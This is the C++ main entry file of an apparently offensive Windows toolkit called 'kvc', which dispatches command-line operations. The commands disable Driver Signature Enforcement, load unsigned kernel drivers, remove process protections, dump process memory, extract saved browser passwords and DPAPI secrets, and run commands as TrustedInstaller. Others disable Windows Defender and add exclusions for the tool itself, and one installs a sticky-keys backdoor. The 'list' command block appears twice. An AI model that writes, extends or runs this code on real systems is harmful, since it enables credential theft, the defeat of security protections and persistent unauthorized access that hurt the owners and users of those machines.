// Kernel Vulnerability Capabilities Framework - Main Application Entry Point

#include "common.h"
#include "Controller.h"
#include "DSEBypass.h"
#include "HelpSystem.h"
#include "DefenderManager.h"
#include "ProcessManager.h"
#include "ServiceManager.h"
#include "HiveManager.h"
#include <signal.h>
#include <charconv>
#include <Shlobj.h>

#pragma comment(lib, "Shell32.lib")

// ============================================================================
// GLOBAL STATE
// ============================================================================

// Global controller instance for driver and system operations
std::unique_ptr<Controller> g_controller;

// Signal handler flag for graceful shutdown
volatile bool g_interrupted = false;

// ============================================================================
// FORWARD DECLARATIONS
// ============================================================================

void CleanupDriver() noexcept;
std::optional<DWORD> ParsePid(std::wstring_view pidStr) noexcept;
bool IsNumeric(std::wstring_view str) noexcept;
bool IsHelpFlag(std::wstring_view arg) noexcept;
bool CheckKvcPassExists() noexcept;
bool InitiateSystemRestart() noexcept;

// ============================================================================
// SIGNAL HANDLERS
// ============================================================================

// Emergency signal handler for Ctrl+C - ensures proper driver cleanup to prevent system instability
void SignalHandler(int signum)
{
    if (signum == SIGINT) {
        g_interrupted = true;
        ERROR(L"\nInterrupted by user - performing emergency cleanup...");
        CleanupDriver();
        exit(130); // Standard exit code for Ctrl+C
    }
}

// ============================================================================
// HELPER FUNCTIONS
// ============================================================================

// Robust PID parsing with validation using std::from_chars, rejects non-ASCII characters
std::optional<DWORD> ParsePid(std::wstring_view pidStr) noexcept
{
    if (pidStr.empty()) return std::nullopt;

    // Convert wide string to narrow for std::from_chars compatibility
    std::string narrowStr;
    narrowStr.reserve(pidStr.size());
    
    for (wchar_t wc : pidStr) {
        if (wc > 127) return std::nullopt; // Non-ASCII character detected
        narrowStr.push_back(static_cast<char>(wc));
    }

    DWORD result = 0;
    auto [ptr, ec] = std::from_chars(narrowStr.data(), 
                                     narrowStr.data() + narrowStr.size(), 
                                     result);
    
    return (ec == std::errc{} && ptr == narrowStr.data() + narrowStr.size()) ? 
           std::make_optional(result) : std::nullopt;
}

// Checks if string contains only digits
bool IsNumeric(std::wstring_view str) noexcept
{
    if (str.empty()) return false;
    
    for (wchar_t ch : str) {
        if (ch < L'0' || ch > L'9')
            return false;
    }
    
    return true;
}

// Recognizes various help flag formats: /?, /help, /h, -?, -help, -h, --help, --h, help, ?
bool IsHelpFlag(std::wstring_view arg) noexcept
{
    if (arg == L"/?" || arg == L"/help" || arg == L"/h")
        return true;
    
    if (arg == L"-?" || arg == L"-help" || arg == L"-h")
        return true;
    
    if (arg == L"--help" || arg == L"--h")
        return true;
    
    if (arg == L"help" || arg == L"?")
        return true;
    
    return false;
}

// Checks if kvc_pass.exe exists in current directory or System32
bool CheckKvcPassExists() noexcept
{
    // Check current directory
    if (GetFileAttributesW(L"kvc_pass.exe") != INVALID_FILE_ATTRIBUTES) 
        return true;
    
    // Check System32
    wchar_t systemDir[MAX_PATH];
    if (GetSystemDirectoryW(systemDir, MAX_PATH) > 0) {
        std::wstring path = std::wstring(systemDir) + L"\\kvc_pass.exe";
        return GetFileAttributesW(path.c_str()) != INVALID_FILE_ATTRIBUTES;
    }
    
    return false;
}

// Initiates system restart with SE_SHUTDOWN_NAME privilege for security engine changes
bool InitiateSystemRestart() noexcept
{
    HANDLE token;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
        ERROR(L"Failed to open process token for restart");
        return false;
    }

    if (!LookupPrivilegeValueW(nullptr, SE_SHUTDOWN_NAME, &luid)) {
        ERROR(L"Failed to lookup shutdown privilege");
        CloseHandle(token);
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    bool success = AdjustTokenPrivileges(token, FALSE, &tp, 0, nullptr, nullptr);
    CloseHandle(token);

    if (!success) {
        ERROR(L"Failed to enable shutdown privilege");
        return false;
    }

    // Initiate system restart with appropriate reason code
    return ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 
                        SHTDN_REASON_MAJOR_SOFTWARE | SHTDN_REASON_MINOR_RECONFIGURE) != 0;
}

// Emergency cleanup for driver resources - called on exit or Ctrl+C
void CleanupDriver() noexcept
{
    if (g_controller) {
        g_controller->PerformAtomicCleanup();
    }
}

// ============================================================================
// MAIN APPLICATION ENTRY POINT
// ============================================================================

// Main entry point with comprehensive command handling for service management, process operations, browser extraction, security operations and more
int wmain(int argc, wchar_t* argv[])
{
    // Install signal handler for emergency cleanup on Ctrl+C
    signal(SIGINT, SignalHandler);
    
    // Service mode detection - MUST BE FIRST to handle NT service startup
    if (argc >= 2) {
        std::wstring_view firstArg = argv[1];
        if (firstArg == L"--service") {
            return ServiceManager::RunAsService();
        }
    }
    
    // Display comprehensive help if no arguments provided
    if (argc < 2) {
        HelpSystem::PrintUsage(argv[0]);
        return 1;
    }

    std::wstring_view firstArg = argv[1];
    
    // Handle various help flag formats
    if (IsHelpFlag(firstArg)) {
        HelpSystem::PrintUsage(argv[0]);
        return 0;
    }

    // Initialize controller for kernel operations and driver management
    g_controller = std::make_unique<Controller>();
    std::wstring_view command = firstArg;

    try {
        // ====================================================================
        // SERVICE MANAGEMENT COMMANDS
        // ====================================================================
        
        if (command == L"install") {
            wchar_t exePath[MAX_PATH];
            if (GetModuleFileNameW(nullptr, exePath, MAX_PATH) == 0) {
                ERROR(L"Failed to get current executable path");
                return 1;
            }
            
            INFO(L"Installing Kernel Vulnerability Capabilities Framework service...");
            bool success = ServiceManager::InstallService(exePath);
            return success ? 0 : 1;
        }
        
        else if (command == L"uninstall") {
            INFO(L"Uninstalling Kernel Vulnerability Capabilities Framework service...");
            bool success = ServiceManager::UninstallService();
            
            // Clear the entire configuration from the registry
            INFO(L"Cleaning up registry configuration...");
            HKEY hKey;
            if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
                LONG result = RegDeleteTreeW(hKey, L"kvc");
                if (result == ERROR_SUCCESS) {
                    SUCCESS(L"Registry configuration cleaned successfully");
                } else if (result == ERROR_FILE_NOT_FOUND) {
                    INFO(L"No registry configuration found to clean");
                } else {
                    ERROR(L"Failed to clean registry configuration: %d", result);
                }
                RegCloseKey(hKey);
            }
            
            return success ? 0 : 1;
        }
		
		// ============================================================================
		// DSE (DRIVER SIGNATURE ENFORCEMENT) COMMANDS
		// ============================================================================

		else if (command == L"dse") {
			// No parameter = check status
			if (argc < 3) {
				DEBUG(L"Checking Driver Signature Enforcement status...");
				
				ULONG_PTR ciOptionsAddr = 0;
				DWORD value = 0;
				
				if (!g_controller->GetDSEStatus(ciOptionsAddr, value)) {
					ERROR(L"Failed to retrieve DSE status");
					return 2;
				}
				
				bool dseEnabled = (value & 0x6) != 0;  // Bit 1 and 2 = DSE
                bool hvciEnabled = (value & 0x0001C000) == 0x0001C000;  // Memory Integrity ON - requires reboot (TODO: verify for testsigning/debug/hyperlaunch)
				
				std::wcout << L"\n";
				INFO(L"DSE Status Information:");
				INFO(L"g_CiOptions address: 0x%llX", ciOptionsAddr);
				INFO(L"g_CiOptions value: 0x%08X", value);
				auto dseNGCallback = SessionManager::GetOriginalCiCallback();
				if (dseNGCallback != 0) {
					INFO(L"DSE-NG (Safe Mode) active - callback saved: 0x%llX", dseNGCallback);
				}

				std::wcout << L"\n";
				
				// Check for HVCI/VBS first
				if (hvciEnabled) {
					INFO(L"Memory Integrity enabled - use 'kvc dse off --safe' (requires reboot)");
				}
				else if (dseEnabled) {
					SUCCESS(L"DSE can be safely disabled using 'kvc dse off --safe'");
				} else {
					INFO(L"Driver signature enforcement: DISABLED");
					INFO(L"Unsigned drivers allowed");
					INFO(L"Use 'kvc dse on --safe' to restore kernel protection");
				}
				
				std::wcout << L"\n";
				return 0;
			}
			
			std::wstring_view subCmd = argv[2];
            bool safeMode = false;

            // Check for --safe flag in 3rd argument
            if (argc >= 4) {
                std::wstring_view flag = argv[3];
                if (flag == L"--safe") {
                    safeMode = true;
                }
            }
			
			if (subCmd == L"off") {
                if (safeMode) {
                    INFO(L"Executing Next-Gen DSE Bypass (PDB-based)...");
                    if (!g_controller->DisableDSESafe()) {
                        return 2;
                    }
                    return 0;
                }
                
				HKEY hKey;
				bool postReboot = false;
				
				if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Kvc\\DSE", 0, 
								  KEY_READ, &hKey) == ERROR_SUCCESS) {
					wchar_t state[256] = {0};
					DWORD size = sizeof(state);
					
					if (RegQueryValueExW(hKey, L"State", NULL, NULL, 
										reinterpret_cast<BYTE*>(state), &size) == ERROR_SUCCESS) {
						if (wcscmp(state, L"AwaitingRestore") == 0) {
							postReboot = true;
						}
					}
					
					RegCloseKey(hKey);
				}
				
				if (postReboot) {
					DEBUG(L"Post-reboot DSE disable detected");
					INFO(L"Completing DSE bypass after reboot...");
					
					if (!g_controller->DisableDSEAfterReboot()) {
						ERROR(L"Failed to complete DSE disable after reboot");
						return 2;
					}
				} else {
					DEBUG(L"Normal DSE disable request");
					INFO(L"Disabling driver signature enforcement...");
					
					if (!g_controller->DisableDSE()) {
						ERROR(L"Failed to disable DSE");
						return 2;
					}
				}
				
			//wesmar-debug: INFO(L"g_CiOptions address: 0x%llX", g_controller->GetCiOptionsAddress());
				return 0;
			}
			else if (subCmd == L"on") {
                if (safeMode) {
                    INFO(L"Restoring DSE using Next-Gen method...");
                    if (!g_controller->RestoreDSESafe()) {
                        return 2;
                    }
                    return 0;
                }

				INFO(L"Restoring driver signature enforcement...");
				
				if (!g_controller->RestoreDSE()) {
					ERROR(L"Failed to restore DSE");
					return 2;
				}
			return 0;
			}
			else {
				ERROR(L"Unknown DSE command: %s", subCmd.data());
				ERROR(L"Usage: kvc dse [off|on]  or  kvc dse  (status)");
				return 1;
			}
		}
		
		// ============================================================================
		// EXTERNAL DRIVER LOADING COMMANDS
		// ============================================================================
		
		else if (command == L"driver") {
			if (argc < 3) {
				ERROR(L"Missing driver subcommand");
				ERROR(L"Usage: kvc driver <load|reload|stop|remove> <path|name>");
				return 1;
			}
			
			std::wstring subCmd = StringUtils::ToLowerCaseCopy(std::wstring(argv[2]));
			
			if (subCmd == L"load") {
				if (argc < 4) {
					ERROR(L"Missing driver path");
					ERROR(L"Usage: kvc driver load <path> [-s <0-4>]");
					return 1;
				}
				
				std::wstring driverPath = argv[3];
				DWORD startType = SERVICE_DEMAND_START;  // Default: 3 (DEMAND)
				
				// Check for optional -s flag
				if (argc >= 6) {
					std::wstring flag = StringUtils::ToLowerCaseCopy(std::wstring(argv[4]));
					if (flag == L"-s") {
						int type = _wtoi(argv[5]);
						if (type >= 0 && type <= 4) {
							startType = static_cast<DWORD>(type);
						}
					}
				}
				
				return g_controller->LoadExternalDriver(driverPath, startType) ? 0 : 2;
			}
			else if (subCmd == L"reload") {
				if (argc < 4) {
					ERROR(L"Missing driver name/path");
					ERROR(L"Usage: kvc driver reload <name|path>");
					return 1;
				}
				
				return g_controller->ReloadExternalDriver(argv[3]) ? 0 : 2;
			}
			else if (subCmd == L"stop") {
				if (argc < 4) {
					ERROR(L"Missing driver name");
					ERROR(L"Usage: kvc driver stop <name>");
					return 1;
				}
				
				return g_controller->StopExternalDriver(argv[3]) ? 0 : 2;
			}
			else if (subCmd == L"remove") {
				if (argc < 4) {
					ERROR(L"Missing driver name");
					ERROR(L"Usage: kvc driver remove <name>");
					return 1;
				}
				
				return g_controller->RemoveExternalDriver(argv[3]) ? 0 : 2;
			}
			else {
				ERROR(L"Unknown driver subcommand: %s", subCmd.c_str());
				ERROR(L"Usage: kvc driver <load|reload|stop|remove> <path|name>");
				return 1;
			}
		}
		
		else if (command == L"service") {
            if (argc < 3) {
                ERROR(L"Missing service command: start, stop, restart");
                return 1;
            }
            
            std::wstring_view subCmd = argv[2];
            
			if (subCmd == L"start") {
				INFO(L"Starting Kernel Vulnerability Capabilities Framework service...");
				bool result = ServiceManager::StartServiceProcess();
				if (result) {
					SUCCESS(L"Service started successfully");
				} else {
					ERROR(L"Failed to start service");
				}
				return result ? 0 : 1;
			} else if (subCmd == L"stop") {
				INFO(L"Stopping Kernel Vulnerability Capabilities Framework service...");
				bool result = ServiceManager::StopServiceProcess();
				if (result) {
					SUCCESS(L"Service stopped successfully");
				} else {
					ERROR(L"Failed to stop service");
				}
				return result ? 0 : 1;
			} else if (subCmd == L"restart") {
				INFO(L"Restarting Kernel Vulnerability Capabilities Framework service...");
				
				INFO(L"Stopping service...");
				bool stopped = ServiceManager::StopServiceProcess();
				if (stopped) {
					SUCCESS(L"Service stopped");
				} else {
					ERROR(L"Failed to stop service");
				}
				
				// Only for service debug Sleep(500);
				
				INFO(L"Starting service...");
				bool started = ServiceManager::StartServiceProcess();
				if (started) {
					SUCCESS(L"Service started");
				} else {
					ERROR(L"Failed to start service");
				}
				
				return (stopped && started) ? 0 : 1;
			} else if (subCmd == L"status") {
				INFO(L"Checking Kernel Vulnerability Capabilities Framework service status...");
				
				const bool installed = IsServiceInstalled();
				const bool running = installed ? IsServiceRunning() : false;
				
				std::wcout << L"\n";
				INFO(L"Service Information:");
				INFO(L" Name: %s", ServiceConstants::SERVICE_NAME);
				INFO(L" Display Name: %s", ServiceConstants::SERVICE_DISPLAY_NAME);
				std::wcout << L"\n";
				
				if (installed) {
					SUCCESS(L"Installation Status: INSTALLED");
					if (running) {
						SUCCESS(L"Runtime Status: RUNNING");
						SUCCESS(L"Service is operational and ready for kernel operations");
					} else {
						ERROR(L"Runtime Status: STOPPED");
						INFO(L"Use 'kvc service start' to start the service");
					}
				} else {
					ERROR(L"Installation Status: NOT INSTALLED");
					INFO(L"Use 'kvc install' to install the service first");
				}
				
				std::wcout << L"\n";
				return 0;
			} else {
				ERROR(L"Unknown service command: %s", subCmd.data());
				return 1;
			}
        }
        
        // ====================================================================
        // PROCESS INFORMATION COMMANDS
        // ====================================================================
        
        else if (command == L"list") {
            // Detect reboot and enforce session limit
            g_controller->m_sessionMgr.DetectAndHandleReboot();
            return g_controller->ListProtectedProcesses() ? 0 : 2;
        }
        
		// ====================================================================
		// PROCESS INFORMATION COMMANDS
		// ====================================================================

		else if (command == L"list") {
			// Detect reboot and enforce session limit
			g_controller->m_sessionMgr.DetectAndHandleReboot();
			return g_controller->ListProtectedProcesses() ? 0 : 2;
		}

		else if (command == L"get")
		{
			if (argc < 3)
			{
				ERROR(L"Missing PID/process name argument");
				return 1;
			}

			std::wstring_view target = argv[2];
			
			// Simple protection info display
			if (IsNumeric(target))
			{
				auto pid = ParsePid(target);
				if (!pid)
				{
					ERROR(L"Invalid PID format: %s", target.data());
					return 1;
				}
				return g_controller->GetProcessProtection(pid.value()) ? 0 : 2;
			}
			else
			{
				std::wstring processName(target);
				return g_controller->GetProcessProtectionByName(processName) ? 0 : 2;
			}
		}

		else if (command == L"info") {
			if (argc < 3) {
				ERROR(L"Missing PID/process name argument for detailed information");
				return 1;
			}

			std::wstring_view target = argv[2];
			
			if (IsNumeric(target)) {
				auto pid = ParsePid(target);
				if (!pid) {
					ERROR(L"Invalid PID format: %s", target.data());
					return 1;
				}
				return g_controller->PrintProcessInfo(pid.value()) ? 0 : 2;
			} else {
				std::wstring processName(target);
				auto match = g_controller->ResolveNameWithoutDriver(processName);
				if (match) {
					return g_controller->PrintProcessInfo(match->Pid) ? 0 : 2;
				} else {
					return 2;
				}
			}
		}		

        else if (command == L"list-signer") {
            if (argc < 3) {
                ERROR(L"Missing signer type argument");
                return 1;
            }
            
            std::wstring signerName = argv[2];
            return g_controller->ListProcessesBySigner(signerName) ? 0 : 1;
        }
        
        // ====================================================================
        // PROCESS PROTECTION COMMANDS
        // ====================================================================
        
        else if (command == L"set" || command == L"protect") {
            if (argc < 5) {
                ERROR(L"Missing arguments: <PID/process_name> <PP|PPL> <SIGNER_TYPE>");
                return 1;
            }
            
            std::wstring_view target = argv[2];
            std::wstring level = argv[3];
            std::wstring signer = argv[4];
            
            // Handle comma-separated list for batch operations
            std::wstring targetStr(target);
            if (targetStr.find(L',') != std::wstring::npos) {
                std::vector<std::wstring> targets;
                std::wstring current;
                
                for (wchar_t ch : targetStr) {
                    if (ch == L',') {
                        if (!current.empty()) {
                            targets.push_back(current);
                            current.clear();
                        }
                    } else if (ch != L' ' && ch != L'\t') {
                        current += ch;
                    }
                }
                
                if (!current.empty())
                    targets.push_back(current);
                
                if (targets.empty()) {
                    ERROR(L"No valid targets in comma-separated list");
                    return 1;
                }
                
                INFO(L"Batch %s operation: %zu targets", command.data(), targets.size());
                
                bool result = (command == L"set") ?
                    g_controller->SetMultipleProcessesProtection(targets, level, signer) :
                    g_controller->ProtectMultipleProcesses(targets, level, signer);
                
                return result ? 0 : 2;
            }
            
            // Single target (PID or name)
            bool result = false;
            
            if (IsNumeric(target)) {
                auto pid = ParsePid(target);
                if (!pid) {
                    ERROR(L"Invalid PID format: %s", target.data());
                    return 1;
                }
                
                result = (command == L"set") ?
                    g_controller->SetProcessProtection(pid.value(), level, signer) :
                    g_controller->ProtectProcess(pid.value(), level, signer);
            } else {
                std::wstring processName(target);
                
                result = (command == L"set") ?
                    g_controller->SetProcessProtectionByName(processName, level, signer) :
                    g_controller->ProtectProcessByName(processName, level, signer);
            }
            
            return result ? 0 : 2;
        }
        
		else if (command == L"unprotect") {
			if (argc < 3) {
				ERROR(L"Missing PID/process name argument");
				return 1;
			}
			
			std::wstring_view target = argv[2];
			
			// Handle special 'all' keyword
			if (target == L"all") {
				return g_controller->UnprotectAllProcesses() ? 0 : 2;
			}
			
			// Handle comma-separated list
			std::wstring targetStr(target);
			if (targetStr.find(L',') != std::wstring::npos) {
				std::vector<std::wstring> targets;
				std::wstring current;
				
				for (wchar_t ch : targetStr) {
					if (ch == L',') {
						if (!current.empty()) {
							targets.push_back(current);
							current.clear();
						}
					} else if (ch != L' ' && ch != L'\t') {
						current += ch;
					}
				}
				
				if (!current.empty())
					targets.push_back(current);
				
				return g_controller->UnprotectMultipleProcesses(targets) ? 0 : 2;
			}
			
			// Single target - check if it's a signer type FIRST
			auto signerType = Utils::GetSignerTypeFromString(targetStr);
			if (signerType) {
				// It's a signer type - unprotect all processes with this signer
				return g_controller->UnprotectBySigner(targetStr) ? 0 : 2;
			}
			
			// Not a signer - check if it's PID or process name
			if (IsNumeric(target)) {
				auto pid = ParsePid(target);
				if (!pid) {
					ERROR(L"Invalid PID format: %s", target.data());
					return 1;
				}
				return g_controller->UnprotectProcess(pid.value()) ? 0 : 2;
			} else {
				std::wstring processName(target);
				return g_controller->UnprotectProcessByName(processName) ? 0 : 2;
			}
		}
        
        else if (command == L"unprotect-signer") {
            if (argc < 3) {
                ERROR(L"Missing signer type argument");
                return 1;
            }
            
            std::wstring signerName = argv[2];
            return g_controller->UnprotectBySigner(signerName) ? 0 : 2;
        }
		
		else if (command == L"set-signer") {
			if (argc < 5) {
				ERROR(L"Missing arguments: <CURRENT_SIGNER> <PP|PPL> <NEW_SIGNER>");
				return 1;
			}
			
			std::wstring currentSigner = argv[2];
			std::wstring level = argv[3];
			std::wstring newSigner = argv[4];
			
			auto signerType = Utils::GetSignerTypeFromString(currentSigner);
			if (!signerType) {
				ERROR(L"Invalid signer type: %s", currentSigner.c_str());
				return 1;
			}
			
			return g_controller->SetProtectionBySigner(currentSigner, level, newSigner) ? 0 : 2;
		}
        
        // ====================================================================
        // MEMORY DUMPING
        // ====================================================================
        
        else if (command == L"dump") {
            if (argc < 3) {
                ERROR(L"Missing PID/process name argument");
                return 1;
            }

            std::wstring_view target = argv[2];
            std::wstring outputPath;

            // Use provided output path or default to Downloads
            if (argc >= 4) {
                outputPath = argv[3];
            } else {
                wchar_t* downloadsPath;
                if (SHGetKnownFolderPath(FOLDERID_Downloads, 0, NULL, &downloadsPath) == S_OK) {
                    outputPath = downloadsPath;
                    outputPath += L"\\";
                    CoTaskMemFree(downloadsPath);
                } else {
                    outputPath = L".\\";
                }
            }

            if (IsNumeric(target)) {
                auto pid = ParsePid(target);
                if (!pid) {
                    ERROR(L"Invalid PID format: %s", target.data());
                    return 1;
                }
                return g_controller->DumpProcess(pid.value(), outputPath) ? 0 : 2;
            } else {
                std::wstring processName(target);
                return g_controller->DumpProcessByName(processName, outputPath) ? 0 : 2;
            }
        }
        
        // ====================================================================
        // PROCESS TERMINATION
        // ====================================================================
        
        else if (command == L"kill") {
            ProcessManager::HandleKillCommand(argc, argv, g_controller.get());
            return 0;
        }
        
        // ====================================================================
        // BROWSER PASSWORD EXTRACTION
        // ====================================================================
        
        else if (command == L"browser-passwords" || command == L"bp") {
            std::wstring browserType = L"chrome";
            std::wstring outputPath = L".";
            
            // Parse arguments
            for (int i = 2; i < argc; i++) {
                std::wstring arg = argv[i];
                if (arg == L"--chrome") {
                    browserType = L"chrome";
                } else if (arg == L"--brave") {
                    browserType = L"brave";
                } else if (arg == L"--edge") {
                    browserType = L"edge";
                } else if (arg == L"--all") {
                    browserType = L"all";
                } else if (arg == L"--output" || arg == L"-o") {
                    if (i + 1 < argc) {
                        outputPath = argv[++i];
                    } else {
                        ERROR(L"Missing path for --output argument");
                        return 1;
                    }
                } else {
                    ERROR(L"Unknown argument: %s", arg.c_str());
                    return 1;
                }
            }
            
            // Handle 'all' - requires kvc_pass.exe
            if (browserType == L"all") {
                if (!CheckKvcPassExists()) {
                    ERROR(L"--all requires kvc_pass.exe");
                    return 1;
                }
                
                if (!g_controller->ExportBrowserData(outputPath, browserType)) {
                    ERROR(L"Failed to extract from all browsers");
                    return 1;
                }
                return 0;
            }
            
            // Handle Edge with dual extraction
            if (browserType == L"edge") {
                bool hasKvcPass = CheckKvcPassExists();
                
                if (hasKvcPass) {
                    INFO(L"Full Edge extraction: JSON (kvc_pass) + HTML/TXT (KVC DPAPI)");
                    
                    if (!g_controller->ExportBrowserData(outputPath, browserType)) {
                        ERROR(L"kvc_pass extraction failed");
                    }
                    
                    INFO(L"Generating HTML/TXT reports...");
                    g_controller->ShowPasswords(outputPath);
                    
                    SUCCESS(L"Edge extraction complete");
                } else {
                    INFO(L"Using built-in Edge DPAPI extraction (HTML/TXT only)");
                    g_controller->ShowPasswords(outputPath);
                }
                return 0;
            }
            
            // Chrome, Brave - require kvc_pass.exe
            if (!g_controller->ExportBrowserData(outputPath, browserType)) {
                ERROR(L"Failed to export browser passwords");
                return 1;
            }
            return 0;
        }
        
        else if (command == L"export") {
            if (argc < 3) {
                ERROR(L"Missing export subcommand: secrets");
                return 1;
            }
            
            std::wstring_view subCommand = argv[2];
            
			if (subCommand == L"secrets") {
				std::wstring outputPath = (argc >= 4) ? argv[3] : PathUtils::GetDefaultSecretsOutputPath();
				
				if (outputPath.empty()) {
					ERROR(L"Failed to determine default output path");
					return 1;
				}
                g_controller->ShowPasswords(outputPath);
                return 0;
            } else {
                ERROR(L"Unknown export subcommand: %s", subCommand.data());
                return 1;
            }
        }
        
        // ====================================================================
        // SYSTEM INTEGRATION
        // ====================================================================
        
        else if (command == L"trusted") {
            if (argc < 3) {
                ERROR(L"Missing command for elevated execution");
                return 1;
            }

            // Combine remaining arguments
            std::wstring fullCommand;
            for (int i = 2; i < argc; i++) {
                if (i > 2) fullCommand += L" ";
                fullCommand += argv[i];
            }

            return g_controller->RunAsTrustedInstaller(fullCommand) ? 0 : 2;
        }
        
        else if (command == L"install-context") {
            return g_controller->AddContextMenuEntries() ? 0 : 1;
        }
        
		// ====================================================================
		// WINDOWS DEFENDER MANAGEMENT
		// ====================================================================

		else if (command == L"secengine") {
			if (argc < 3) {
				ERROR(L"Missing subcommand for secengine. Usage: kvc secengine <disable|enable|status>");
				return 1;
			}
			
			std::wstring_view subcommand = argv[2];
			
			if (subcommand == L"disable") {
				if (DefenderManager::DisableSecurityEngine()) {
					SUCCESS(L"Security engine disabled successfully - restart required");
					
					if (argc > 3 && std::wstring_view(argv[3]) == L"--restart") {
						INFO(L"Initiating system restart...");
						return InitiateSystemRestart() ? 0 : 1;
					}
					return 0;
				}
				return 1;
			}
			else if (subcommand == L"enable") {
				if (DefenderManager::EnableSecurityEngine()) {
					SUCCESS(L"Security engine enabled successfully - restart required");
					
					if (argc > 3 && std::wstring_view(argv[3]) == L"--restart") {
						INFO(L"Initiating system restart...");
						return InitiateSystemRestart() ? 0 : 1;
					}
					return 0;
				}
				return 1;
			}
			else if (subcommand == L"status") {
				auto status = DefenderManager::GetSecurityEngineStatus();
				
				if (status == DefenderManager::SecurityState::ENABLED) {
					INFO(L"Security Engine Status: ENABLED (Active Protection)");
					HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
					SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN | FOREGROUND_INTENSITY);
					std::wcout << L" Windows Defender is actively protecting the system\n";
					SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
				}
				else if (status == DefenderManager::SecurityState::DISABLED) {
					INFO(L"Security Engine Status: DISABLED (Inactive Protection)");
					HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
					SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_INTENSITY);
					std::wcout << L" Windows Defender protection is disabled\n";
					SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
				}
				else {
					INFO(L"Security Engine Status: UNKNOWN (Cannot determine state)");
					HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
					SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
					std::wcout << L" Unable to determine Defender protection state\n";
					SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
				}
				
				return 0;
			}
			else {
				ERROR(L"Invalid secengine subcommand: %s", subcommand.data());
				ERROR(L"Valid subcommands: disable, enable, status");
				return 1;
			}
		}

		else if (command == L"add-exclusion") {
			// Legacy: no args = add self
			if (argc < 3) {
				wchar_t exePath[MAX_PATH];
				if (GetModuleFileNameW(nullptr, exePath, MAX_PATH) == 0) {
					ERROR(L"Failed to get current executable path");
					return 1;
				}
				
				INFO(L"Adding self to Defender exclusions: %s", exePath);
				return g_controller->AddToDefenderExclusions(exePath) ? 0 : 2;
			}
			
			std::wstring subCmd = StringUtils::ToLowerCaseCopy(argv[2]);
			
			if (subCmd == L"paths" || subCmd == L"path") {
				if (argc < 4) {
					ERROR(L"Missing path argument");
					return 1;
				}
				return g_controller->AddPathExclusion(argv[3]) ? 0 : 2;
			}
			else if (subCmd == L"processes" || subCmd == L"process") {
				if (argc < 4) {
					ERROR(L"Missing process argument");
					return 1;
				}
				return g_controller->AddProcessExclusion(argv[3]) ? 0 : 2;
			}
			else if (subCmd == L"extensions" || subCmd == L"extension") {
				if (argc < 4) {
					ERROR(L"Missing extension argument");
					return 1;
				}
				return g_controller->AddExtensionExclusion(argv[3]) ? 0 : 2;
			}
			else if (subCmd == L"ipaddresses" || subCmd == L"ip") {
				if (argc < 4) {
					ERROR(L"Missing IP address argument");
					return 1;
				}
				return g_controller->AddIpAddressExclusion(argv[3]) ? 0 : 2;
			}
			else {
				// Legacy: treat as direct path
				return g_controller->AddToDefenderExclusions(argv[2]) ? 0 : 2;
			}
		}
		
		else if (command == L"remove-exclusion") {
			// Legacy: no args = remove self
			if (argc < 3) {
				wchar_t exePath[MAX_PATH];
				if (GetModuleFileNameW(nullptr, exePath, MAX_PATH) == 0) {
					ERROR(L"Failed to get current executable path");
					return 1;
				}
				
				INFO(L"Removing self from Defender exclusions: %s", exePath);
				return g_controller->RemoveFromDefenderExclusions(exePath) ? 0 : 2;
			}
			
			std::wstring subCmd = StringUtils::ToLowerCaseCopy(argv[2]);
			
			if (subCmd == L"paths" || subCmd == L"path") {
				if (argc < 4) {
					ERROR(L"Missing path argument");
					return 1;
				}
				return g_controller->RemovePathExclusion(argv[3]) ? 0 : 2;
			}
			else if (subCmd == L"processes" || subCmd == L"process") {
				if (argc < 4) {
					ERROR(L"Missing process argument");
					return 1;
				}
				return g_controller->RemoveProcessExclusion(argv[3]) ? 0 : 2;
			}
			else if (subCmd == L"extensions" || subCmd == L"extension") {
				if (argc < 4) {
					ERROR(L"Missing extension argument");
					return 1;
				}
				return g_controller->RemoveExtensionExclusion(argv[3]) ? 0 : 2;
			}
			else if (subCmd == L"ipaddresses" || subCmd == L"ip") {
				if (argc < 4) {
					ERROR(L"Missing IP address argument");
					return 1;
				}
				return g_controller->RemoveIpAddressExclusion(argv[3]) ? 0 : 2;
			}
			else {
				// Legacy: treat as direct path
				return g_controller->RemoveFromDefenderExclusions(argv[2]) ? 0 : 2;
			}
		}
		
	    else if (command == L"disable-defender") {
            INFO(L"Disabling Windows Defender (requires restart)...");
            bool result = DefenderManager::DisableSecurityEngine();
            
            if (result) {
                SUCCESS(L"Windows Defender disabled successfully");
                INFO(L"System restart required to apply changes");
                
                if (argc >= 3 && std::wstring_view(argv[2]) == L"--restart") {
                    INFO(L"Initiating system restart...");
                    return InitiateSystemRestart() ? 0 : 2;
                }
            }
            
            return result ? 0 : 2;
        }
        
        else if (command == L"enable-defender") {
            return DefenderManager::EnableSecurityEngine() ? 0 : 2;
        }
        
        // ====================================================================
        // STICKY KEYS BACKDOOR
        // ====================================================================
        
        else if (command == L"shift") {
            INFO(L"Installing sticky keys backdoor...");
            return g_controller->InstallStickyKeysBackdoor() ? 0 : 2;
        }
        
        else if (command == L"unshift") {
            INFO(L"Removing sticky keys backdoor...");
            return g_controller->RemoveStickyKeysBackdoor() ? 0 : 2;
        }
        
        // ====================================================================
        // REGISTRY OPERATIONS
        // ====================================================================
        
        else if (command == L"registry") {
            if (argc < 3) {
